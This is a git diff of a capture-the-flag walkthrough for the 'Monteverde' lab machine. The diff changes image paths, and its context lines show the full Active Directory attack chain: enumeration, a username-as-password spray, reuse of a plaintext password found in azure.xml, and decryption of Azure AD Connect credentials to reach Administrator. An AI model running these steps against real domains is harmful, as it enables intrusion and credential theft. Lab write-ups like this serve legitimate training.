@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.228.111
 ```
 
-![ping](monteverde_01_ping.png)
+![ping](screenshots/monteverde_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -61,7 +61,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.111 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](monteverde_02_nmap_allports.png)
+![allports](screenshots/monteverde_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -69,7 +69,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](monteverde_03_extractports.png)
+![extractports](screenshots/monteverde_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -85,8 +85,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](monteverde_04_nmap_targeted_1.png)
-![targeted 2](monteverde_05_nmap_targeted_2.png)
+![targeted 1](screenshots/monteverde_04_nmap_targeted_1.png)
+![targeted 2](screenshots/monteverde_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -110,7 +110,7 @@ Enumerate SMB and guest/null-session behavior:
 crackmapexec smb 10.129.228.111
 ```
 
-![cme smb](monteverde_06_cme_smb_fingerprint.png)
+![cme smb](screenshots/monteverde_06_cme_smb_fingerprint.png)
 
 Test unauthenticated share listing:
 
@@ -118,7 +118,7 @@ Test unauthenticated share listing:
 smbclient -L //10.129.228.111 -N
 ```
 
-![smbclient anon](monteverde_07_smbclient_list_anonymous.png)
+![smbclient anon](screenshots/monteverde_07_smbclient_list_anonymous.png)
 
 ---
 ### 2.2 LDAP anonymous bind + lockout policy
@@ -130,7 +130,7 @@ Before attempting a password spray, we check the domain lockout policy via LDAP.
 ldapsearch -x -H ldap://10.129.228.111 -b "dc=megabank,dc=local" -s sub "*" | grep -i lockout
 ```
 
-![ldap lockout](monteverde_08_ldap_lockoutthreshold.png)
+![ldap lockout](screenshots/monteverde_08_ldap_lockoutthreshold.png)
 
 Key value observed:
 
@@ -153,7 +153,7 @@ rpcclient -U '' -N 10.129.228.111 -N
 # rpcclient $> querydispinfo
 ```
 
-![rpc users](monteverde_09_rpcclient_enum.png)
+![rpc users](screenshots/monteverde_09_rpcclient_enum.png)
 
 Extract usernames to `users.txt` for spraying:
 
@@ -162,7 +162,7 @@ rpcclient -U '' -N 10.129.228.111 -N -c "enumdomusers" | grep -oP '\[.*?\]' | gr
 cat users.txt
 ```
 
-![users txt](monteverde_10_users_txt.png)
+![users txt](screenshots/monteverde_10_users_txt.png)
 
 Using RPC, we were able to obtain a list of domain users that we could not enumerate via SMB without credentials.
 
@@ -179,7 +179,7 @@ We start with `GetNPUsers` to quickly check if any of the users are AS-REP roast
 impacket-GetNPUsers MEGABANK.LOCAL/ -no-pass -usersfile users.txt
 ```
 
-![getnpusers](monteverde_11_getnpusers.png)
+![getnpusers](screenshots/monteverde_11_getnpusers.png)
 
 No AS-REP roastable users were found in this run, so we proceed with a direct authentication spray and model **password == username** by using `users.txt` as both the username list and the password wordlist.
 
@@ -187,7 +187,7 @@ No AS-REP roastable users were found in this run, so we proceed with a direct au
 crackmapexec smb 10.129.228.111 -u users.txt -p users.txt --continue-on-success
 ```
 
-![spray sabatchjobs](monteverde_12_cme_spray_sabatchjobs.png)
+![spray sabatchjobs](screenshots/monteverde_12_cme_spray_sabatchjobs.png)
 
 Here we pass the same `users.txt` as both the username list and the password wordlist to model **password == username**.
 This is a practical shortcut: if a username `SABatchJobs` exists and its password is also `SABatchJobs`, the spray will find it.
@@ -204,7 +204,7 @@ WinRM was not allowed for this account:
 crackmapexec winrm 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs'
 ```
 
-![winrm fail](monteverde_13_cme_winrm_sabatchjobs_fail.png)
+![winrm fail](screenshots/monteverde_13_cme_winrm_sabatchjobs_fail.png)
 
 ---
 ### 3.2 SMB shares as `SABatchJobs` 
@@ -215,11 +215,11 @@ SMB authentication works for this account:
 crackmapexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
 ```
 
-![shares](monteverde_14_cme_shares_sabatchjobs.png)
+![shares](screenshots/monteverde_14_cme_shares_sabatchjobs.png)
 
 The `azure_uploads` and `users$` share is readable. Browse it and pull interesting artifacts:
 
-![azure xml get](monteverde_15_smbclient_get_azure_xml.png)
+![azure xml get](screenshots/monteverde_15_smbclient_get_azure_xml.png)
 
 ---
 ### 3.3 `azure.xml` password reuse â†’ WinRM as `mhope`
@@ -230,7 +230,7 @@ After retrieving `azure.xml`, inspect it locally for any stored credentials befo
 cat azure.xml
 ```
 
-![azure xml cat](monteverde_16_azure_xml_password.png)
+![azure xml cat](screenshots/monteverde_16_azure_xml_password.png)
 
 **Password found (redact before publishing):** `4n0therD4y@n0th3r$`
 
@@ -240,7 +240,7 @@ Validate password reuse across users (spray with a single password):
 crackmapexec smb 10.129.228.111 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
 ```
 
-![cme mhope](monteverde_17_cme_mhope_valid.png)
+![cme mhope](screenshots/monteverde_17_cme_mhope_valid.png)
 
 WinRM works for `mhope`:
 
@@ -253,7 +253,7 @@ dir
 cat user.txt
 ```
 
-![user flag](monteverde_23_user_txt.png)
+![user flag](screenshots/monteverde_23_user_txt.png)
 
 ðŸ **User flag obtained**
 
@@ -269,8 +269,8 @@ whoami /all
 net user mhope
 ```
 
-![whoami all](monteverde_18_whoami_all.png)
-![net user](monteverde_19_net_user_mhope.png)
+![whoami all](screenshots/monteverde_18_whoami_all.png)
+![net user](screenshots/monteverde_19_net_user_mhope.png)
 
 The `mhope` user is a member of the `Azure Admins` group. Since Azure AD Connect / ADSync is a common privesc path on this machine, we inspect `C:\Program Files` to confirm related components are installed.
 
@@ -279,7 +279,7 @@ cd C:\Program Files
 dir
 ```
 
-![program files](monteverde_20_program_files_adconnect.png)
+![program files](screenshots/monteverde_20_program_files_adconnect.png)
 
 Notable directories:
 
@@ -306,8 +306,8 @@ upload /path/to/mcrypt.dll
 dir
 ```
 
-![upload tools 1](monteverde_21_upload_adsyncdecrypt_1.png)
-![upload tools 2](monteverde_22_upload_adsyncdecrypt_2.png)
+![upload tools 1](screenshots/monteverde_21_upload_adsyncdecrypt_1.png)
+![upload tools 2](screenshots/monteverde_22_upload_adsyncdecrypt_2.png)
 
 Run the tool from the Azure AD Sync `Bin` directory (working directory requirement):
 
@@ -316,7 +316,7 @@ cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
 C:\Windows\Temp\privesc\AdDecrypt.exe -FullSQL
 ```
 
-![decrypted creds](monteverde_24_adsyncdecrypt_decrypted_creds.png)
+![decrypted creds](screenshots/monteverde_24_adsyncdecrypt_decrypted_creds.png)
 
 **Decrypted credentials observed:**
 
@@ -333,7 +333,7 @@ These credentials should work over WinRM:
 crackmapexec winrm 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
 ```
 
-![evilwinrm admin](monteverde_25_evilwinrm_administrator.png)
+![evilwinrm admin](screenshots/monteverde_25_evilwinrm_administrator.png)
 
 Read `root.txt`:
 
@@ -345,7 +345,7 @@ dir
 type root.txt
 ```
 
-![root flag](monteverde_26_root_txt.png)
+![root flag](screenshots/monteverde_26_root_txt.png)
 
 ðŸ **Root flag obtained**
 
